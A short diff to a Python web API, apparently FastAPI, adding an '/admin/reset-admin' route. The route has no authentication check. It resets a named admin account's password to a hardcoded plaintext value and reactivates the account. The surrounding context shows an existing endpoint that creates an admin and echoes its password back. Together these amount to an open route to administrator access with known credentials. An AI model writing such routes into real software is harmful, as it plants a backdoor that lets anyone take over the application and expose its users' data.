@@ -112,6 +112,18 @@ def create_admin_user_api(db: Session = Depends(get_db)):
     db.commit()
     return {"message": f"Admin user '{username}' created with password '{password}'."}
 
+@router.post("/admin/reset-admin")
+def reset_admin_user_api(db: Session = Depends(get_db)):
+    username = "blakvelvet"
+    password = "chibuike_douglas"
+    user = db.query(User).filter(User.username == username).first()
+    if not user:
+        return {"message": f"User '{username}' not found."}
+    user.hashed_password = get_password_hash(password)
+    user.status = "active"
+    db.commit()
+    return {"message": f"Admin user '{username}' password reset and status set to active."}
+
 @router.get("/list-users")
 def list_users(db: Session = Depends(get_db)):
     users = db.query(User).all()
